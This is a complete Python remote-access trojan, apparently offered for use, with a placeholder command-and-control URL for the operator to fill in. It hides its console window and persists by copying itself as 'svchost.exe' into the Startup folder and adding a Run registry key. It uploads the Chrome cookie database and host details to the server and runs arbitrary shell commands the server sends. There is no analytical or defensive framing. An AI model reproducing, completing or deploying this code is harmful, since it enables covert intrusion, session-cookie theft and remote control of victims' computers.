import socket
import subprocess
import os
import getpass
import requests
import shutil
import sys
import threading
import time
from urllib.request import urlretrieve

# CONFIGURATION - CHANGE THESE VALUES
C2_SERVER = "http://your-c2-domain.com"  # Replace with your C2 server
INTERVAL = 60  # Check for commands every X seconds

# PERSISTENCE: Copy to AppData and add to startup
def ensure_persistence():
    try:
        username = getpass.getuser()
        appdata = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        exe_path = os.path.join(appdata, "svchost.exe")
        
        if not os.path.exists(exe_path):
            shutil.copy(sys.executable, exe_path)
            subprocess.Popen(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "SystemHelper" /t REG_SZ /d "{exe_path}"', shell=True)
    except:
        pass

# EXFILTRATE SENSITIVE DATA
def steal_data():
    try:
        info = f"[+] Host: {socket.gethostname()}\n"
        info += f"[+] User: {getpass.getuser()}\n"
        info += f"[+] CWD: {os.getcwd()}\n"
        
        # Grab browser cookies (example: Chrome)
        cookies_db = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
        if os.path.exists(cookies_db):
            shutil.copy(cookies_db, "cookies.db")
            files = {'file': open('cookies.db', 'rb')}
            requests.post(C2_SERVER + "/upload", files=files)
            os.remove("cookies.db")

        # Send basic system info
        requests.post(C2_SERVER + "/exfil", data=info)
    except:
        pass

# EXECUTE REMOTE COMMANDS
def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

# MAIN CALLBACK LOOP
def reverse_shell():
    while True:
        try:
            resp = requests.get(C2_SERVER)
            command = resp.text.strip()

            if command.startswith("exec:"):
                cmd = command.split("exec:", 1)[1]
                result = execute_command(cmd)
                requests.post(C2_SERVER + "/result", data=result)

            elif command == "steal":
                steal_data()

            elif command == "kill":
                break

        except:
            pass

        time.sleep(INTERVAL)

# HIDE CONSOLE WINDOW (Windows)
def hide_console():
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

if __name__ == "__main__":
    hide_console()
    ensure_persistence()
    steal_data()
    reverse_shell()
